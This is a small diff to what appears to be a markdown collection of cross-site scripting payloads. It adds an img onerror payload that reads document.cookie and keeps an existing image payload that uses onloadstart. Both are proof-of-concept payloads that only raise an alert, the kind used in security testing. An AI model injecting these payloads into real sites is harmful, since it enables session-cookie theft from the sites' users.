@@ -1,3 +1,7 @@
+## Self Cross-Site Scripting 
+```mysql
+<img src="" onerror="alert(document.cookie)">
+```
 ## Non ExistantImage
 ```
 <div><image src=validateNonExistantImage.png onloadstart=alert(1337)> hey girl hey </div>
